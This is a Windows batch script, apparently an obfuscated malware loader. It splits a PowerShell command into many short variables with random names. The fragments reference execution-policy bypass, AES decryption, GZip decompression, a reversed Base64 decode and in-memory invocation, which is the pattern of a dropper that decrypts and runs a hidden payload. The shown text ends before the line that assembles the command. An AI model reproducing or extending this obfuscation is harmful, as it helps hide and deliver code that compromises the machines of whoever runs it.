@echo off
set "IdDFadvkQT=;$fo"
set "VtzfAlaukv= [Sy"
set "EcwBRZWyDx=Comp"
set "ewJttQYZzt=oryS"
set "PaaCmurESp=in $"
set "NiTkGVtmLK=2VUN"
set "giJVqsDTbn=pMDf"
set "JlGFAKzriB=.Con"
set "iptKjwmiuk=Secu"
set "JuabHziYhr=Stre"
set "GNuGbkfUpo=eam("
set "gqwrCfQHTP=AT.T"
set "pjmgnGlsgw=th('"
set "ICjZnDcrgr=ionM"
set "puvIHvLmDP=);$p"
set "lnpdIPaTYF=.Cry"
set "tJRNnuIZlx=Obje"
set "vkaNCEZaul=raph"
set "zuBBlyTzUt= [Sy"
set "IHzRqjmKhk=ose("
set "xUkqhonNpc=$QUX"
set "WMqShXAavS=ne);"
set "aaMarVbaVS=g = "
set "JBLsOANInp=m.IO"
set "tvJflogRWw=n ''"
set "WKRNwzhSTF=Invo"
set "vYbxSBIHRF=esaB"
set "pnBynUkJaT== $F"
set "tpUvqRPkNs=;$qH"
set "xdueOeTSTG=-joi"
set "smjXdsVOGG=y]::"
set "DDxDpgaPSn=)($G"
set "mOJdMpcPwW=A.En"
set "gOqUmEFxyz=fore"
set "bJVxeIZUcc=..-1"
set "UkIsDgQRBA=6esa"
set "LbhGfnHeVr=A) {"
set "sutNEUhMBQ=$ppM"
set "oZZWopNVgo=dV1k"
set "zazyTHYDhK='[-1"
set "eiCrbICXZz=$ppM"
set "ZfmdzxQSFz=ew-O"
set "PCvMaSeYwZ=ach "
set "nPqioWnSky=.Len"
set "QOicrTFiWV=-ep "
set "JleISlVuhE=m.IO"
set "uSCHRqSSDU=rity"
set "PdSltGdEym=n ''"
set "qmVLPgOpfO=am;$"
set "XHJdDMDHHV=ke($"
set "ISgsMzMkvi=('da"
set "seiOUHTEqR=($TN"
set "XCgSLEInVm=.Mod"
set "KWriuFaMCg= [st"
set "nFUikRCoXP=d;$F"
set "sQCPIKYhKG=[Env"
set "htCahUmJrw=ress"
set "ovvsziYWBw=mory"
set "uPHWuOCyPS=;$nT"
set "zAmDWsJVCS= = N"
set "aCvPdaFbLP=]::("
set "GLHuucOgpo=ypto"
set "GzVIrMqGrG=e = "
set "rkOByFNfBy=esMa"
set "ysFigSyZhx=File"
set "SyzpKInLev=gth)"
set "xjAhIEDlfX=e]::"
set "kgxepITlhx=New-"
set "nIFwNMiVkH=sion"
set "OoNkAgZNbT=ateD"
set "XhhLvKWMQe=.GZi"
set "UaGCeyOyco=();$"
set "vYwrTwwowS= '')"
set "qGSHDkRurs=saBm"
set "vmOQzGgauO=yste"
set "XnVfFFRQBd=k; }"
set "HWgYbNnSkI=Syst"
set "zLjBNdGkiM=:: '"
set "DYsDfzempX=Fina"
set "cjrpUpxiBO=..-1"
set "fwPiHxUYMU=morF"
set "IpvLzeRWUm=ZytX"
set "WLDhOxAqdW=O.Me"
set "WhQLWFGhgJ=jYlG"
set "kxvgzcimiC=jYlG"
set "qYNOxHtHxS=.Key"
set "vOBwEVkthC=ress"
set "ZAvITzpTdZ=PKCS"
set "zDXqXPcOJH='[-1"
set "WBWdtHMPFI=Secu"
set "xLqrfvxycc=ewLi"
set "cxcXMXLchT=tryP"
set "WlnCxkAMto=jYlG"
set "PazMoiEQqD=]::C"
set "rDBiRQErQt=, $Z"
set "uBlpONQvAB=;$fo"
set "WyNTDFhmeD=[Sys"
set "NHVEcbMUaY=ose("
set "yTSMzhBHDu=ZytX"
set "jPIDjMkajl=3); "
set "xAEIzoWjOR=Obje"
set "DtLcJhJLuU=Df ="
set "fLfQokqGbo=orF'"
set "maGbUDwmfq=nTXO"
set "FGHkqhCXXt=em.I"
set "OPisxEfGpE=hy.A"
set "jFwAKBLBAo=i = "
set "dkYRgXmEfb=)))"
set "MImIQOUhGK=rtS4"
set "PphOYMbaQk=TNYp"
set "KaCgxzHFPO=; };"
set "CezgDwAsdY= '')"
set "CJpQyyPpIR='txe"
set "DQzbKLybwG=tem."
set "wZPyiFyKCG=ddin"
set "uuMovpRwvD=-1.."
set "eTCvnAUrgN=]::("
set "MmIBRlIImh=Star"
set "ujpXSDmFox=m(, "
set "ipMaQjloLi=QUXh"
set "oqiYBrPNeL=bstr"
set "DsZVQTwIiF=and "
set "IyPWEvSxAO=G.Pa"
